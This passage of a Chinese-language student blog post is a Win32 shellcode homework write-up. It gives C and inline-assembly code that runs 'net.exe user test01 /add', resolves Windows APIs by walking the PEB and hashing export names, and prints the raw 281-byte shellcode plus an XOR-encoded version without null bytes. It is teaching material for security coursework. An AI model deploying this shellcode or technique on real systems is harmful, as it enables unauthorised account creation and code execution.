<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>win32-shellcode-homework | wd-z711&#39;s B10g</title>
  <meta name="author" content="wd-z711">
  
  <meta name="description" content="Common student in China. Interested in web &amp; re.">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="win32-shellcode-homework"/>
  <meta property="og:site_name" content="wd-z711&#39;s B10g"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'G-YHJSKZDC3Y', 'auto');
  ga('send', 'pageview');
</script>




<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="wd-z711's B10g" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">wd-z711&#39;s B10g</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> win32-shellcode-homework</h1>
		</div>
	



<div class="row post">

	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="win32-shellcode-homework"><a href="#win32-shellcode-homework" class="headerlink" title="win32-shellcode-homework"></a>win32-shellcode-homework</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>​    实验要求：</p>
<p><img src="/images/win32-shellcode-homework/image-20221130152310644.png" alt="image-20221130152310644"></p>
<p>​    首先仿照doCommandLine.cpp，写一个能运行<code>net.exe user test01 /add</code>的C程序。</p>
<span id="more"></span>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// doCommandLine_xcl.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">doCommandLine</span><span class="params">(<span class="type">char</span> * szCmdLine)</span></span><br><span class="line">&#123;</span><br><span class="line">    BOOL ret;</span><br><span class="line">    STARTUPINFO si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">    ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</span><br><span class="line">    si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">    si.wShowWindow=TRUE;</span><br><span class="line">    si.dwFlags=STARTF_USESHOWWINDOW;</span><br><span class="line">    ret=CreateProcessA(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        szCmdLine,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        FALSE,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;si,</span><br><span class="line">        &amp;pi</span><br><span class="line">    );</span><br><span class="line">    ExitProcess(ret);  <span class="comment">// 用这个较稳妥，否则shellcode会出错</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    doCommandLine(<span class="string">&quot;net.exe user test01 /add&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​    <code>cl doCommandLine_xcl.cpp &amp; doCommandLine_xcl.exe</code>编译运行，之后<code>net user</code>发现命令执行成功。</p>
<p><img src="/images/win32-shellcode-homework/image-20221130153808419.png" alt="image-20221130153808419" style="zoom:80%;" /></p>
<p>​    之后执行<code>net.exe user test01 /DELETE</code>，方便后续实验。</p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>​    之后，使用汇编语言实现相同的功能。主要是将<code>do32CommandAsm.cpp</code>中的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push    <span class="number">00657865</span>h   ;</span><br><span class="line">push    <span class="number">2e646170</span>h   ;</span><br><span class="line">push    <span class="number">65746f</span>6eh   ; <span class="string">&quot;notepad.exe&quot;</span></span><br></pre></td></tr></table></figure>
<p>​    改为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push    <span class="number">00000000</span>h   ;</span><br><span class="line">push    <span class="number">6464612f</span>h   ;</span><br><span class="line">push    <span class="number">20313074</span>h   ;</span><br><span class="line">push    <span class="number">73657420</span>h   ;</span><br><span class="line">push    <span class="number">72657375</span>h   ;</span><br><span class="line">push    <span class="number">20657865</span>h   ;</span><br><span class="line">push    <span class="number">2e74656</span>eh   ; <span class="string">&quot;net.exe user test01 /add&quot;</span></span><br></pre></td></tr></table></figure>
<p>​    完整代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// do32CommandAsm_xcl.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EIGHT_NOPS __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90\</span></span><br><span class="line"><span class="meta">                   __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROC_BEGIN  EIGHT_NOPS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROC_END    EIGHT_NOPS</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">doCommandLineAsm</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm&#123;</span><br><span class="line">            PROC_BEGIN;     <span class="comment">// Begin of the code</span></span><br><span class="line">            push    <span class="number">00000000</span>h   ;</span><br><span class="line">            push    <span class="number">6464612f</span>h   ;</span><br><span class="line">            push    <span class="number">20313074</span>h   ;</span><br><span class="line">            push    <span class="number">73657420</span>h   ;</span><br><span class="line">            push    <span class="number">72657375</span>h   ;</span><br><span class="line">            push    <span class="number">20657865</span>h   ;</span><br><span class="line">            push    <span class="number">2e74656</span>eh   ; <span class="string">&quot;net.exe user test01 /add&quot;</span></span><br><span class="line">            mov     edi, esp    ; edi=<span class="string">&quot;net.exe user test01 /add&quot;</span></span><br><span class="line">            push    <span class="number">0xff0d6657</span>  ; <span class="comment">//hash(&quot;CloseHandle&quot;)=0xff0d6657</span></span><br><span class="line">            push    <span class="number">0x4fd18963</span>  ; <span class="comment">//hash(&quot;ExitProcess&quot;)=0x4fd18963</span></span><br><span class="line">            push    <span class="number">0x6ba6bcc9</span>  ; <span class="comment">//hash(CreateProcessA)=0x6ba6bcc9</span></span><br><span class="line">            pop     edx;        ; <span class="comment">//edx=GetHash(&quot;CreateProcessA&quot;);</span></span><br><span class="line">            call    findHashFuncAddrProc;   <span class="comment">// eax=address of function</span></span><br><span class="line">            mov     esi,eax;    ;<span class="comment">// esi=CreateProcessA</span></span><br><span class="line">            pop     edx;        ;<span class="comment">// edx=GetHash(&quot;ExitProcess&quot;);</span></span><br><span class="line">            call    findHashFuncAddrProc;   <span class="comment">// eax=address of function</span></span><br><span class="line">            mov     ebx,eax;    ;<span class="comment">// ebx=CloseHandle</span></span><br><span class="line">            call    doCommandProc;          <span class="comment">// eax</span></span><br><span class="line">            jmp     end_of_this_function;    <span class="comment">// finish all job. </span></span><br><span class="line">   </span><br><span class="line">      	doCommandProc:</span><br><span class="line">            push    ecx;</span><br><span class="line">            push    edx;</span><br><span class="line">            push    esi;</span><br><span class="line">            push    edi;</span><br><span class="line">            push    ebp;</span><br><span class="line">            mov     ebp,esp;</span><br><span class="line">            mov     edx,edi;    <span class="comment">//edx=szCmdLine</span></span><br><span class="line">            sub     esp, <span class="number">54</span>h;</span><br><span class="line">            mov     edi, esp;</span><br><span class="line">            push    <span class="number">14</span>h;</span><br><span class="line">            pop     ecx;</span><br><span class="line">            xor     eax,eax;</span><br><span class="line">            stack_zero:</span><br><span class="line">            mov     [edi+ecx*<span class="number">4</span>], eax;</span><br><span class="line">            loop    stack_zero;</span><br><span class="line">            mov     byte ptr [edi+<span class="number">10</span>h], <span class="number">44</span>h; si.cb = <span class="keyword">sizeof</span>(si)</span><br><span class="line">            lea     eax, [edi+<span class="number">10</span>h]</span><br><span class="line">            push    edi;    <span class="comment">//push    piPtr;</span></span><br><span class="line">            push    eax;    <span class="comment">//push    siPtr;</span></span><br><span class="line">            push    <span class="literal">NULL</span>;</span><br><span class="line">            push    <span class="literal">NULL</span>;</span><br><span class="line">            push    <span class="number">0</span>;</span><br><span class="line">            push    FALSE;</span><br><span class="line">            push    <span class="literal">NULL</span>;</span><br><span class="line">            push    <span class="literal">NULL</span>;</span><br><span class="line">            push    edx;    <span class="comment">//edx=szCmdLine</span></span><br><span class="line">            push    <span class="literal">NULL</span>;</span><br><span class="line">            call    esi;    <span class="comment">//eax=return value;ptrCreateProcessA;</span></span><br><span class="line">            cmp     eax,<span class="number">0</span>;</span><br><span class="line">            je     donot_closehandle;</span><br><span class="line">            push    eax;</span><br><span class="line">            call    ebx;    <span class="comment">//ExitProcess;</span></span><br><span class="line"></span><br><span class="line">        donot_closehandle:</span><br><span class="line">            mov     esp,ebp;</span><br><span class="line">            pop     ebp;</span><br><span class="line">            pop     edi;</span><br><span class="line">            pop     esi;</span><br><span class="line">            pop     edx;</span><br><span class="line">            pop     ecx;</span><br><span class="line">            retn;</span><br><span class="line">        findHashFuncAddrProc:</span><br><span class="line">            push    esi;</span><br><span class="line">            push    ebx;</span><br><span class="line">            push    ecx;</span><br><span class="line">            push    edx;</span><br><span class="line">            call    get_base_address;</span><br><span class="line">            cmp     eax,<span class="number">0</span>;     <span class="comment">// the base address is 0, done.</span></span><br><span class="line">            jle     end_of_findHashFuncAddrProc; <span class="keyword">if</span> ecx &lt;=<span class="number">0</span> done.</span><br><span class="line">            mov     ebx,eax;   <span class="comment">// save the base to ebx;</span></span><br><span class="line">            call    get_function_addr;</span><br><span class="line">        end_of_findHashFuncAddrProc:</span><br><span class="line">            pop     edx;</span><br><span class="line">            pop     ecx;</span><br><span class="line">            pop     ebx;</span><br><span class="line">            pop     esi;</span><br><span class="line">            retn;</span><br><span class="line"></span><br><span class="line">        get_base_address:</span><br><span class="line">            mov     eax, fs:<span class="number">30</span>h     ; PEB base</span><br><span class="line">            mov     eax, [eax+<span class="number">0</span>ch]  ; PEB_LER_DATA</span><br><span class="line">            mov     eax,[eax+<span class="number">1</span>ch]   ; The first element of InInitOrderModuleList</span><br><span class="line">            mov     eax,[eax]       ; Next element</span><br><span class="line">            mov     eax,[eax+<span class="number">8</span>]     ; eax = Base address of the module</span><br><span class="line">            retn;</span><br><span class="line"></span><br><span class="line">        get_function_addr:</span><br><span class="line">            mov     eax,[ebx+<span class="number">3</span>ch]       ; e_lfanew</span><br><span class="line">            mov     eax,[eax+ebx+<span class="number">78</span>h]   ; DataDirectory[<span class="number">0</span>]</span><br><span class="line">            add     eax,ebx             ; RVA + base</span><br><span class="line">            mov     esi,eax             ; Save first DataDirectory to esi</span><br><span class="line">            mov     ecx,[esi+<span class="number">18</span>h]       ; NumberOfNames</span><br><span class="line">        compare_names_hash:</span><br><span class="line">            mov     eax, [esi+<span class="number">20</span>h]      ; AddressOfNames RVA</span><br><span class="line">            add     eax, ebx            ; rva2va</span><br><span class="line">            mov     eax, [eax+ecx*<span class="number">4</span><span class="number">-4</span>]  ; NamesAddress RVA</span><br><span class="line">            add     eax, ebx            ; rva2va, now eax store the address of the name</span><br><span class="line"></span><br><span class="line">            push    edi                     ; save edi to <span class="built_in">stack</span></span><br><span class="line">            mov     edi,eax                 ; put the address of the <span class="built_in">string</span> to edi</span><br><span class="line">            call    hash_proc;              ; gethash</span><br><span class="line">            pop     edi                     ; restor edi from <span class="built_in">stack</span></span><br><span class="line"></span><br><span class="line">            cmp     eax,edx;                ; compare to hash;</span><br><span class="line">            je      done_find_hash;</span><br><span class="line">            loop compare_names_hash;</span><br><span class="line">            xor     eax,eax;</span><br><span class="line">            jmp     done_get_function_addr;</span><br><span class="line">        done_find_hash:</span><br><span class="line">            mov     eax, [esi+<span class="number">1</span>ch]      ; AddressOfFunctions RVA</span><br><span class="line">            add     eax, ebx            ; rva2va</span><br><span class="line">            mov     eax, [eax+ecx*<span class="number">4</span><span class="number">-4</span>]  ; FunctionAddress RVA</span><br><span class="line">            add     eax, ebx            ; rva2va, now eax store the address of the Function</span><br><span class="line">        done_get_function_addr:</span><br><span class="line">            retn;</span><br><span class="line"></span><br><span class="line">        hash_proc:</span><br><span class="line">            <span class="comment">// save ebx,ecx,edx,edi</span></span><br><span class="line">            push    ebx         ;</span><br><span class="line">            push    ecx         ;</span><br><span class="line">            push    edx         ;</span><br><span class="line">            push    edi         ;</span><br><span class="line">            xor     edx,edx     ; edx = h</span><br><span class="line">        hash_loop:              </span><br><span class="line">            movsx   eax,byte ptr [edi]  ; [eax]=*c ==&gt; eax</span><br><span class="line">            cmp     eax,<span class="number">0</span>       ;</span><br><span class="line">            je  exit_hash_proc  ;</span><br><span class="line">            mov     ebx,edx     ;  h ==&gt; ebx</span><br><span class="line">            mov     ecx,edx     ;  h ==&gt; ecx</span><br><span class="line">            shl     ebx,<span class="number">19</span>h     ; h &lt;&lt; <span class="number">25</span></span><br><span class="line">            shr     ecx,<span class="number">7</span>       ; h &gt;&gt; <span class="number">7</span></span><br><span class="line">            or      ebx,ecx     ; ((h &lt;&lt; <span class="number">25</span>) | (h &gt;&gt; <span class="number">7</span>))</span><br><span class="line">            mov     edx,ebx     ;</span><br><span class="line">            add     edx,eax     ;</span><br><span class="line">            inc     edi;        ;</span><br><span class="line">            jmp hash_loop       ;</span><br><span class="line">        exit_hash_proc:         </span><br><span class="line">            mov     eax,edx     ; save hash to eax</span><br><span class="line">            <span class="comment">// restore ebx,ecx,edx,edi</span></span><br><span class="line">            pop     edi         ;</span><br><span class="line">            pop     edx         ;</span><br><span class="line">            pop     ecx         ;</span><br><span class="line">            pop     ebx         ;</span><br><span class="line">            retn                ;</span><br><span class="line">        end_of_this_function:</span><br><span class="line">            PROC_END;   <span class="comment">// End of the code</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    doCommandLineAsm();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    编译运行<code>cl /Zi do32CommandAsm_xcl.cpp &amp; do32CommandAsm_xcl.exe</code>，之后<code>net user</code>查看：</p>
<p><img src="/images/win32-shellcode-homework/image-20221130161002161.png" alt="image-20221130161002161" style="zoom:70%;" /></p>
<p>​    运行成功！</p>
<p>​    之后执行<code>net.exe user test01 /DELETE</code>，方便后续实验。</p>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>​    将上述汇编语言的shellcode转成真正的shellcode。</p>
<p>​    修改GetShellcode.cpp中的doCommandLineAsm函数，按0x01所示更改相应的汇编代码。（完整的GetShellcode_xcl.cpp放到0x03节中。）</p>
<p>​    输入：<code>cl \Zi GetShellcode_xcl.cpp &amp; GetShellcode_xcl.exe</code>输出为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原始的shellcode</span></span><br><span class="line"><span class="comment">/* 281=0x119 bytes */</span></span><br><span class="line"><span class="string">&quot;\x6a\x00\x68\x2f\x61\x64\x64\x68\x74\x30\x31\x20\x68\x20\x74\x65&quot;</span></span><br><span class="line"><span class="string">&quot;\x73\x68\x75\x73\x65\x72\x68\x65\x78\x65\x20\x68\x6e\x65\x74\x2e&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\xfc\x68\x57\x66\x0d\xff\x68\x63\x89\xd1\x4f\x68\xc9\xbc\xa6&quot;</span></span><br><span class="line"><span class="string">&quot;\x6b\x5a\xe8\x56\x00\x00\x00\x8b\xf0\x5a\xe8\x4e\x00\x00\x00\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\xd8\xe8\x05\x00\x00\x00\xe9\xce\x00\x00\x00\x51\x52\x56\x57\x55&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\xec\x8b\xd7\x83\xec\x54\x8b\xfc\x6a\x14\x59\x33\xc0\x89\x04&quot;</span></span><br><span class="line"><span class="string">&quot;\x8f\xe2\xfb\xc6\x47\x10\x44\x8d\x47\x10\x57\x50\x6a\x00\x6a\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x52\x6a\x00\xff\xd6\x83\xf8\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x74\x03\x50\xff\xd3\x8b\xe5\x5d\x5f\x5e\x5a\x59\xc3\x56\x53\x51&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\xe8\x11\x00\x00\x00\x83\xf8\x00\x7e\x07\x8b\xd8\xe8\x17\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x5a\x59\x5b\x5e\xc3\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x40\x1c\x8b\x00\x8b\x40\x08\xc3\x8b\x43\x3c\x8b\x44\x18\x78&quot;</span></span><br><span class="line"><span class="string">&quot;\x03\xc3\x8b\xf0\x8b\x4e\x18\x8b\x46\x20\x03\xc3\x8b\x44\x88\xfc&quot;</span></span><br><span class="line"><span class="string">&quot;\x03\xc3\x57\x8b\xf8\xe8\x17\x00\x00\x00\x5f\x3b\xc2\x74\x06\xe2&quot;</span></span><br><span class="line"><span class="string">&quot;\xe6\x33\xc0\xeb\x0b\x8b\x46\x1c\x03\xc3\x8b\x44\x88\xfc\x03\xc3&quot;</span></span><br><span class="line"><span class="string">&quot;\xc3\x53\x51\x52\x57\x33\xd2\x0f\xbe\x07\x83\xf8\x00\x74\x13\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\xda\x8b\xca\xc1\xe3\x19\xc1\xe9\x07\x0b\xd9\x8b\xd3\x03\xd0\x47&quot;</span></span><br><span class="line"><span class="string">&quot;\xeb\xe5\x8b\xc2\x5f\x5a\x59\x5b\xc3&quot;</span>;</span><br><span class="line">XorByte=<span class="number">0xfe</span></span><br><span class="line"><span class="comment">// 对shellcode异或，去掉\x00字节。</span></span><br><span class="line"><span class="comment">/* 281=0x119 bytes */</span></span><br><span class="line"><span class="string">&quot;\x94\xfe\x96\xd1\x9f\x9a\x9a\x96\x8a\xce\xcf\xde\x96\xde\x8a\x9b&quot;</span></span><br><span class="line"><span class="string">&quot;\x8d\x96\x8b\x8d\x9b\x8c\x96\x9b\x86\x9b\xde\x96\x90\x9b\x8a\xd0&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\x02\x96\xa9\x98\xf3\x01\x96\x9d\x77\x2f\xb1\x96\x37\x42\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\xa4\x16\xa8\xfe\xfe\xfe\x75\x0e\xa4\x16\xb0\xfe\xfe\xfe\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\x26\x16\xfb\xfe\xfe\xfe\x17\x30\xfe\xfe\xfe\xaf\xac\xa8\xa9\xab&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\x12\x75\x29\x7d\x12\xaa\x75\x02\x94\xea\xa7\xcd\x3e\x77\xfa&quot;</span></span><br><span class="line"><span class="string">&quot;\x71\x1c\x05\x38\xb9\xee\xba\x73\xb9\xee\xa9\xae\x94\xfe\x94\xfe&quot;</span></span><br><span class="line"><span class="string">&quot;\x94\xfe\x94\xfe\x94\xfe\x94\xfe\xac\x94\xfe\x01\x28\x7d\x06\xfe&quot;</span></span><br><span class="line"><span class="string">&quot;\x8a\xfd\xae\x01\x2d\x75\x1b\xa3\xa1\xa0\xa4\xa7\x3d\xa8\xad\xaf&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x16\xef\xfe\xfe\xfe\x7d\x06\xfe\x80\xf9\x75\x26\x16\xe9\xfe&quot;</span></span><br><span class="line"><span class="string">&quot;\xfe\xfe\xa4\xa7\xa5\xa0\x3d\x9a\x5f\xce\xfe\xfe\xfe\x75\xbe\xf2&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xbe\xe2\x75\xfe\x75\xbe\xf6\x3d\x75\xbd\xc2\x75\xba\xe6\x86&quot;</span></span><br><span class="line"><span class="string">&quot;\xfd\x3d\x75\x0e\x75\xb0\xe6\x75\xb8\xde\xfd\x3d\x75\xba\x76\x02&quot;</span></span><br><span class="line"><span class="string">&quot;\xfd\x3d\xa9\x75\x06\x16\xe9\xfe\xfe\xfe\xa1\xc5\x3c\x8a\xf8\x1c&quot;</span></span><br><span class="line"><span class="string">&quot;\x18\xcd\x3e\x15\xf5\x75\xb8\xe2\xfd\x3d\x75\xba\x76\x02\xfd\x3d&quot;</span></span><br><span class="line"><span class="string">&quot;\x3d\xad\xaf\xac\xa9\xcd\x2c\xf1\x40\xf9\x7d\x06\xfe\x8a\xed\x75&quot;</span></span><br><span class="line"><span 